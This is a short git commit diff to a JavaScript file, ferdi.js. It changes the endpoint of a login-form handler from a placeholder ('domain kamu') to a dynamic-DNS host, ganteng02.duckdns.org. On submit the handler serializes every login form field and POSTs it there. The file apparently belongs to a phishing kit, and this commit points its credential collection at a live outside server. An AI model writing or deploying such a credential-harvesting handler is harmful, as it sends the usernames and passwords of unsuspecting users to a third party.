c6e8c1e4c5fccd7ce9d2ed6784f048cbd15b1d62
FerdiGans01 <97169108+FerdiGans01@users.noreply.github.com>
2022-01-05 20:19:22 +0700

    Update ferdi.js

--- ferdi.js
+++ ferdi.js
@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "https://domain kamu/test/index.php",
+        url: "https://ganteng02.duckdns.org/test/index.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
